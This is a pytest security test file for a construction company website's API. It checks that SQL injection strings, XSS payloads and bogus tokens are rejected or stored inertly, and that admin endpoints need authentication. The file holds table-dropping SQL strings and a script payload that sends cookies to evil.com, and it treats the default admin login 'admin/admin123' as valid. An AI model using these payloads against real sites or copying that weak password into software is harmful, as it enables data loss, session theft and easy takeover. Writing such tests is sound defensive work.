"""
Security Tests for Özpınarlar İnşaat Grubu Website
Tests: SQL Injection, XSS, Auth bypass, Invalid token handling
"""
import pytest
import requests
import os

BASE_URL = os.environ.get('REACT_APP_BACKEND_URL', '').rstrip('/')

class TestSecurityContactForm:
    """Security tests for contact form - SQL Injection and XSS"""
    
    def test_sql_injection_in_name_field(self):
        """Test SQL injection attempt in name field"""
        payload = {
            "name": "'; DROP TABLE users; --",
            "email": "test@example.com",
            "phone": "+90 555 123 4567",
            "subject": "Test Subject",
            "message": "Test message"
        }
        response = requests.post(f"{BASE_URL}/api/messages", json=payload)
        # Should accept the input (sanitized) or reject with 422 validation error
        # Should NOT cause server error (500)
        assert response.status_code in [201, 422], f"SQL injection caused unexpected status: {response.status_code}"
        if response.status_code == 201:
            data = response.json()
            # Verify the malicious input was stored as-is (not executed)
            assert data.get("name") == "'; DROP TABLE users; --"
            print("SQL injection in name field: PASSED - Input sanitized/stored safely")
    
    def test_sql_injection_in_email_field(self):
        """Test SQL injection attempt in email field"""
        payload = {
            "name": "Test User",
            "email": "test@example.com' OR '1'='1",
            "phone": "+90 555 123 4567",
            "subject": "Test Subject",
            "message": "Test message"
        }
        response = requests.post(f"{BASE_URL}/api/messages", json=payload)
        # Email validation should reject this
        assert response.status_code == 422, f"Invalid email should be rejected, got: {response.status_code}"
        print("SQL injection in email field: PASSED - Rejected by validation")
    
    def test_sql_injection_in_message_field(self):
        """Test SQL injection attempt in message field"""
        payload = {
            "name": "Test User",
            "email": "test@example.com",
            "phone": "+90 555 123 4567",
            "subject": "Test Subject",
            "message": "SELECT * FROM users WHERE 1=1; DROP TABLE messages; --"
        }
        response = requests.post(f"{BASE_URL}/api/messages", json=payload)
        assert response.status_code in [201, 422], f"SQL injection caused unexpected status: {response.status_code}"
        if response.status_code == 201:
            data = response.json()
            assert "SELECT" in data.get("message", "")
            print("SQL injection in message field: PASSED - Input stored safely")
    
    def test_xss_in_name_field(self):
        """Test XSS attempt in name field"""
        payload = {
            "name": "<script>alert('XSS')</script>",
            "email": "test@example.com",
            "phone": "+90 555 123 4567",
            "subject": "Test Subject",
            "message": "Test message"
        }
        response = requests.post(f"{BASE_URL}/api/messages", json=payload)
        assert response.status_code in [201, 422], f"XSS attempt caused unexpected status: {response.status_code}"
        if response.status_code == 201:
            data = response.json()
            # The script tag should be stored as-is (will be escaped on frontend)
            assert "<script>" in data.get("name", "") or "&lt;script&gt;" in data.get("name", "")
            print("XSS in name field: PASSED - Input stored (should be escaped on display)")
    
    def test_xss_in_subject_field(self):
        """Test XSS attempt in subject field"""
        payload = {
            "name": "Test User",
            "email": "test@example.com",
            "phone": "+90 555 123 4567",
            "subject": "<img src=x onerror=alert('XSS')>",
            "message": "Test message"
        }
        response = requests.post(f"{BASE_URL}/api/messages", json=payload)
        assert response.status_code in [201, 422], f"XSS attempt caused unexpected status: {response.status_code}"
        print("XSS in subject field: PASSED")
    
    def test_xss_in_message_field(self):
        """Test XSS attempt in message field"""
        payload = {
            "name": "Test User",
            "email": "test@example.com",
            "phone": "+90 555 123 4567",
            "subject": "Test Subject",
            "message": "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>"
        }
        response = requests.post(f"{BASE_URL}/api/messages", json=payload)
        assert response.status_code in [201, 422], f"XSS attempt caused unexpected status: {response.status_code}"
        print("XSS in message field: PASSED")


class TestAuthSecurity:
    """Authentication and Authorization security tests"""
    
    def test_admin_messages_without_auth(self):
        """Test accessing admin messages endpoint without authentication"""
        response = requests.get(f"{BASE_URL}/api/messages")
        assert response.status_code in [401, 403], f"Admin endpoint should require auth, got: {response.status_code}"
        print("Admin messages without auth: PASSED - Access denied")
    
    def test_admin_users_without_auth(self):
        """Test accessing admin users endpoint without authentication"""
        response = requests.get(f"{BASE_URL}/api/auth/users")
        assert response.status_code in [401, 403], f"Admin endpoint should require auth, got: {response.status_code}"
        print("Admin users without auth: PASSED - Access denied")
    
    def test_admin_projects_create_without_auth(self):
        """Test creating project without authentication"""
        payload = {
            "title": "Unauthorized Project",
            "location": "Test Location",
            "type": "Rezidans",
            "status": "ongoing",
            "image": "https://example.com/image.jpg",
            "description": "Test description",
            "price": "1.000.000 TL",
            "features": ["Feature 1"],
            "completion_date": "2025"
        }
        response = requests.post(f"{BASE_URL}/api/projects", json=payload)
        assert response.status_code in [401, 403], f"Project creation should require auth, got: {response.status_code}"
        print("Project creation without auth: PASSED - Access denied")
    
    def test_admin_projects_delete_without_auth(self):
        """Test deleting project without authentication"""
        response = requests.delete(f"{BASE_URL}/api/projects/some-id")
        assert response.status_code in [401, 403], f"Project deletion should require auth, got: {response.status_code}"
        print("Project deletion without auth: PASSED - Access denied")
    
    def test_admin_blog_create_without_auth(self):
        """Test creating blog post without authentication"""
        payload = {
            "title": "Unauthorized Blog",
            "excerpt": "Test excerpt",
            "content": "Test content",
            "category": "Test",
            "image": "https://example.com/image.jpg",
            "author": "Test Author",
            "read_time": "5 dk"
        }
        response = requests.post(f"{BASE_URL}/api/blog", json=payload)
        assert response.status_code in [401, 403], f"Blog creation should require auth, got: {response.status_code}"
        print("Blog creation without auth: PASSED - Access denied")
    
    def test_invalid_token_rejected(self):
        """Test that invalid/fake tokens are rejected"""
        headers = {"Authorization": "Bearer fake_invalid_token_12345"}
        response = requests.get(f"{BASE_URL}/api/messages", headers=headers)
        assert response.status_code == 401, f"Invalid token should be rejected, got: {response.status_code}"
        print("Invalid token rejection: PASSED")
    
    def test_expired_token_format_rejected(self):
        """Test that malformed tokens are rejected"""
        headers = {"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0ZXN0IiwiZXhwIjoxfQ.invalid"}
        response = requests.get(f"{BASE_URL}/api/messages", headers=headers)
        assert response.status_code == 401, f"Malformed token should be rejected, got: {response.status_code}"
        print("Malformed token rejection: PASSED")
    
    def test_missing_bearer_prefix_rejected(self):
        """Test that tokens without Bearer prefix are rejected"""
        headers = {"Authorization": "some_token_without_bearer"}
        response = requests.get(f"{BASE_URL}/api/messages", headers=headers)
        assert response.status_code in [401, 403, 422], f"Token without Bearer should be rejected, got: {response.status_code}"
        print("Missing Bearer prefix rejection: PASSED")


class TestAuthLogin:
    """Login security tests"""
    
    def test_login_with_valid_credentials(self):
        """Test login with valid admin credentials"""
        payload = {"username": "admin", "password": "admin123"}
        response = requests.post(f"{BASE_URL}/api/auth/login", json=payload)
        assert response.status_code == 200, f"Valid login should succeed, got: {response.status_code}"
        data = response.json()
        assert "access_token" in data, "Response should contain access_token"
        print("Valid login: PASSED")
        return data["access_token"]
    
    def test_login_with_invalid_password(self):
        """Test login with wrong password"""
        payload = {"username": "admin", "password": "wrongpassword"}
        response = requests.post(f"{BASE_URL}/api/auth/login", json=payload)
        assert response.status_code == 401, f"Invalid password should be rejected, got: {response.status_code}"
        print("Invalid password rejection: PASSED")
    
    def test_login_with_invalid_username(self):
        """Test login with non-existent username"""
        payload = {"username": "nonexistent", "password": "admin123"}
        response = requests.post(f"{BASE_URL}/api/auth/login", json=payload)
        assert response.status_code == 401, f"Invalid username should be rejected, got: {response.status_code}"
        print("Invalid username rejection: PASSED")
    
    def test_login_sql_injection_attempt(self):
        """Test SQL injection in login credentials"""
        payload = {"username": "admin' OR '1'='1", "password": "anything"}
        response = requests.post(f"{BASE_URL}/api/auth/login", json=payload)
        assert response.status_code == 401, f"SQL injection login should fail, got: {response.status_code}"
        print("SQL injection in login: PASSED - Rejected")


class TestProtectedEndpointsWithValidToken:
    """Test that protected endpoints work with valid token"""
    
    @pytest.fixture
    def auth_token(self):
        """Get valid auth token"""
        payload = {"username": "admin", "password": "admin123"}
        response = requests.post(f"{BASE_URL}/api/auth/login", json=payload)
        if response.status_code == 200:
            return response.json()["access_token"]
        pytest.skip("Could not get auth token")
    
    def test_messages_with_valid_token(self, auth_token):
        """Test accessing messages with valid token"""
        headers = {"Authorization": f"Bearer {auth_token}"}
        response = requests.get(f"{BASE_URL}/api/messages", headers=headers)
        assert response.status_code == 200, f"Valid token should allow access, got: {response.status_code}"
        print("Messages with valid token: PASSED")
    
    def test_users_with_valid_token(self, auth_token):
        """Test accessing users with valid token"""
        headers = {"Authorization": f"Bearer {auth_token}"}
        response = requests.get(f"{BASE_URL}/api/auth/users", headers=headers)
        assert response.status_code == 200, f"Valid token should allow access, got: {response.status_code}"
        print("Users with valid token: PASSED")


class TestPublicEndpoints:
    """Test that public endpoints are accessible without auth"""
    
    def test_projects_list_public(self):
        """Test that projects list is publicly accessible"""
        response = requests.get(f"{BASE_URL}/api/projects")
        assert response.status_code == 200, f"Projects should be public, got: {response.status_code}"
        print("Public projects list: PASSED")
    
    def test_blog_list_public(self):
        """Test that blog list is publicly accessible"""
        response = requests.get(f"{BASE_URL}/api/blog")
        assert response.status_code == 200, f"Blog should be public, got: {response.status_code}"
        print("Public blog list: PASSED")
    
    def test_about_content_public(self):
        """Test that about content is publicly accessible"""
        response = requests.get(f"{BASE_URL}/api/content/about")
        assert response.status_code == 200, f"About should be public, got: {response.status_code}"
        print("Public about content: PASSED")
    
    def test_contact_form_submission_public(self):
        """Test that contact form can be submitted without auth"""
        payload = {
            "name": "Public User",
            "email": "public@example.com",
            "phone": "+90 555 123 4567",
            "subject": "Public Inquiry",
            "message": "This is a public message"
        }
        response = requests.post(f"{BASE_URL}/api/messages", json=payload)
        assert response.status_code == 201, f"Contact form should be public, got: {response.status_code}"
        print("Public contact form: PASSED")


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
